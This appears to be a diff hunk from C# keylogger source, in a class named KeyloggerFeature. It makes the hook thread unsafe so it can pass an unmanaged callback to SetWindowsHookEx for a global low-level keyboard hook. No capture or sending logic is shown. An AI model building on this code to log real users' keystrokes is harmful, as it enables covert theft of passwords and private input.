@@ -81,11 +81,11 @@ internal static class KeyloggerFeature
 
     // ── Hook thread ────────────────────────────────────────────────────────
 
-    private static void HookThread()
+    private static unsafe void HookThread()
     {
         _threadId = GetCurrentThreadId();
 
-        // Get function pointer for the hook callback
+        // Get function pointer for the hook callback — requires unsafe context
         var fp = (delegate* unmanaged<int, nint, nint, nint>)&HookProc;
         _hook = SetWindowsHookEx(WH_KEYBOARD_LL, (nint)fp, nint.Zero, 0);
 
